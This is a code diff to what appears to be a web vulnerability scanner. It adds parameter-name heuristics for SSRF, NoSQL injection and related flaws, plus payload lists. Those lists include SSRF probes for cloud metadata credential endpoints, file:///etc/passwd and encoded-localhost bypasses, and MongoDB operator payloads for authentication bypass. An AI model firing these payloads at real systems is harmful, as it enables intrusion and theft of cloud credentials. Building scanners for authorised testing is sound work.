@@ -2109,6 +2109,15 @@ class ParameterAnalyzer:
             r'^offset$', r'^start$', r'^end$', r'^page$', r'^pagenum$',
             r'^pag$',
             r'^(year|month|day|date)$', # date params (often in queries)
+
+            # E-commerce numeric params (often injectable)
+            r'^(price|qty|quantity|amount|total|subtotal)$',
+
+            # Range queries
+            r'^(from|to|min|max|range|between)$',
+
+            # Hierarchical relations
+            r'^(parent|parent_id|child|child_id)$',
         ]
 
         # Patterns per File Inclusion (LFI/RFI)
@@ -2147,6 +2156,13 @@ class ParameterAnalyzer:
             r'^config$', r'^conf$', r'^cfg$', r'^ini$',
             r'^lang$', r'^language$', r'^locale$', r'^l10n$',
 
+            # Log/Report/Export files
+            r'^log$', r'^logfile$', r'^logpath$',
+            r'^report$', r'^export$', r'^output$',
+
+            # Backup files
+            r'^backup$', r'^bak$', r'^snapshot$', r'^dump$',
+
             # URL/URI (RFI indicators)
             r'^url$', r'^uri$', r'^link$', r'^href$',
             r'^redirect$', r'^redir$', r'^goto$', r'^next$',
@@ -2161,6 +2177,13 @@ class ParameterAnalyzer:
             r'^(daemon|service|process)$',  # service params
             r'.*cmd$',                  # ends with 'cmd'
             r'^(eval|code)$',           # eval params
+
+            # Temporal params (often passed to sleep/timeout commands)
+            r'^(timeout|sleep|delay|wait)$',
+
+            # Network params (passed to ping/nslookup/dig)
+            r'^(server|addr|address|hostname)$',
+            r'^(nslookup|dig|traceroute|netstat)$',
         ]
 
         # Patterns per XXE
@@ -2216,6 +2239,13 @@ class ParameterAnalyzer:
             # Expressions (direct eval context)
             r'^expr$', r'^expression$', r'^eval$', r'^code$',
             r'^snippet$', r'^fragment$',
+
+            # Preview/Draft (rendered with template engine)
+            r'^preview$', r'^draft$', r'^compose$',
+
+            # Placeholder/Default (values rendered in templates)
+            r'^placeholder$', r'^default$', r'^fallback$',
+            r'^greeting$', r'^welcome$', r'^banner$',
         ]
 
         # Patterns per Open Redirect
@@ -2279,6 +2309,53 @@ class ParameterAnalyzer:
             r'.*_dn$',                  # ends with '_dn'
         ]
 
+        # Patterns per SSRF (Server-Side Request Forgery)
+        self.ssrf_patterns = [
+            # URL/URI params (primary SSRF vectors)
+            r'^(url|uri|href|link|src|source)$',
+            r'^(dest|destination|target|site|website)$',
+
+            # Fetch/Load/Read operations (server-side fetching)
+            r'^(fetch|load|read|open|get|retrieve)$',
+            r'^(callback|webhook|hook|notify|ping)$',
+
+            # Proxy/Forward (request proxying)
+            r'^(proxy|forward|redirect|redir)$',
+            r'^(next|return|continue|goto)$',
+
+            # API/Endpoint params
+            r'^(api|endpoint|host|domain|server)$',
+            r'^(feed|rss|atom|import|export)$',
+
+            # Image/Resource loading from URL
+            r'^(avatar|icon|logo|image_url|img_url)$',
+            r'^(preview|screenshot|thumbnail|thumb)$',
+
+            # Suffixed patterns
+            r'.*_url$', r'.*_uri$', r'.*_link$',
+            r'.*_src$', r'.*_source$', r'.*_endpoint$',
+        ]
+
+        # Patterns per NoSQL Injection
+        self.nosqli_patterns = [
+            # ID/query params (common in MongoDB apps)
+            r'^(id|_id|objectid|oid)$',
+            r'^(user|username|email|login)$',
+
+            # Query/Filter/Search
+            r'^(query|filter|search|find|match|where|lookup)$',
+
+            # MongoDB-specific field names
+            r'^(collection|aggregate|pipeline|projection)$',
+            r'^(selector|condition|criteria|expr)$',
+
+            # JSON-based params (often NoSQL targets)
+            r'^(json|data|body|payload|request)$',
+
+            # Suffixed patterns
+            r'.*_query$', r'.*_filter$', r'.*_search$',
+        ]
+
         # XSS-prone parameter names (often reflected)
         self.xss_reflection_patterns = [
             # Search/Input
@@ -2337,6 +2414,8 @@ class ParameterAnalyzer:
             r'.*list.*id', r'.*ids$',  # multiple IDs
             r'.*filter.*', r'.*where.*', r'.*having.*',
             r'.*sort.*by', r'.*order.*by', r'.*group.*by',
+            r'.*_by$',                  # generic sort_by, filter_by, order_by
+            r'.*_list$', r'.*_array$',  # params passed to IN clause
         ]
 
         # LFI - compound patterns
@@ -2346,6 +2425,8 @@ class ParameterAnalyzer:
             r'.*include.*file', r'.*require.*file',
             r'.*template.*file', r'.*config.*file',
             r'.*image.*path', r'.*media.*path', r'.*resource.*path',
+            r'.*_dir$', r'.*_folder$', r'.*_root$',  # directory suffixes
+            r'.*log.*', r'.*backup.*',                 # log/backup file references
         ]
 
         # XSS - compound patterns
@@ -2409,6 +2490,8 @@ class ParameterAnalyzer:
             'crlf': [re.compile(p, re.IGNORECASE) for p in self.crlf_patterns],
             'xpath': [re.compile(p, re.IGNORECASE) for p in self.xpath_patterns],
             'ldapi': [re.compile(p, re.IGNORECASE) for p in self.ldap_patterns],
+            'ssrf': [re.compile(p, re.IGNORECASE) for p in self.ssrf_patterns],
+            'nosqli': [re.compile(p, re.IGNORECASE) for p in self.nosqli_patterns],
             'xss_reflection': [re.compile(p, re.IGNORECASE) for p in self.xss_reflection_patterns],
             'xss_compound': [re.compile(p, re.IGNORECASE) for p in self.xss_compound_patterns],
             'csrf_action': [re.compile(p, re.IGNORECASE) for p in self.csrf_action_patterns],
@@ -2589,6 +2672,39 @@ class ParameterAnalyzer:
                 'context': 'authentication_parameter',
                 'evidence': f'Parameter name matches auth pattern: {param_name}',
                 'priority': 4
+            })
+
+        # ===== STEP 8.1: SSRF (Server-Side Request Forgery) =====
+        if self._matches_pattern(param_name, 'ssrf'):
+            matched_any_pattern = True
+            # SSRF in URL params è più pericoloso
+            is_url_like = any(p in param_name_lower for p in ['url', 'uri', 'href', 'src', 'link', 'endpoint'])
+            confidence = 70 if is_url_like else 55
+
+            vulnerabilities.append({
+                'type': 'ssrf',
+                'confidence': confidence,
+                'context': 'url_fetch_parameter' if is_url_like else 'potential_ssrf_vector',
+                'evidence': f'Parameter name matches SSRF pattern: {param_name}',
+                'priority': 2 if is_url_like else 3
+            })
+
+        # ===== STEP 8.2: NoSQL Injection =====
+        if self._matches_pattern(param_name, 'nosqli'):
+            matched_any_pattern = True
+            # JSON-like value or MongoDB-style ID boost confidence
+            is_nosql_hint = (
+                param_value_str.startswith(('{', '[', '$'))
+                or param_name_lower in ('_id', 'objectid', 'oid')
+            )
+            confidence = 65 if is_nosql_hint else 45
+
+            vulnerabilities.append({
+                'type': 'nosqli',
+                'confidence': confidence,
+                'context': 'nosql_parameter' if is_nosql_hint else 'potential_nosql_vector',
+                'evidence': f'Parameter name matches NoSQL injection pattern: {param_name}',
+                'priority': 3
             })
 
         # ===== STEP 8.5: CRLF Injection =====
@@ -2947,6 +3063,41 @@ class WordlistMapper:
             "test'",
             "' | //user/password | '",
         ],
+        'ssrf': [
+            # SSRF payloads - internal service probing
+            'http://127.0.0.1/',
+            'http://localhost/',
+            'http://[::1]/',
+            'http://0.0.0.0/',
+            'http://127.1/',
+            # Cloud metadata endpoints
+            'http://169.254.169.254/latest/meta-data/',
+            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            # Alternative protocols
+            'file:///etc/passwd',
+            'gopher://127.0.0.1:25/',
+            'dict://127.0.0.1:11211/',
+            # Bypass techniques
+            'http://2130706433/',  # Decimal 127.0.0.1
+            'http://0x7f000001/',  # Hex 127.0.0.1
+            'http://017700000001/',  # Octal 127.0.0.1
+        ],
+        'nosqli': [
+            # NoSQL Injection payloads - MongoDB operators
+            '{"$gt":""}',
+            '{"$ne":""}',
+            '{"$regex":".*"}',
+            '{"$exists":true}',
+            "' || '1'=='1",
+            '[$ne]=1',
+            '[$gt]=',
+            '[$regex]=.*',
+            # Authentication bypass
+            '{"username":{"$ne":""},"password":{"$ne":""}}',
+            "true, $where: '1 == 1'",
+            "'; return true; var x='",
+        ],
     }
 
     def __init__(self, base_paths=None):
@@ -2977,6 +3128,7 @@ class WordlistMapper:
             'file_upload': ['upload', 'file-upload', 'extension'],
             'idor': ['idor', 'insecure-direct-object'],
             'nosqli': ['nosql', 'mongodb', 'couchdb', 'cassandra'],
+            'ssrf': ['ssrf', 'server-side-request', 'request-forgery', 'url-fetch'],
         }
 
         # Technology keywords
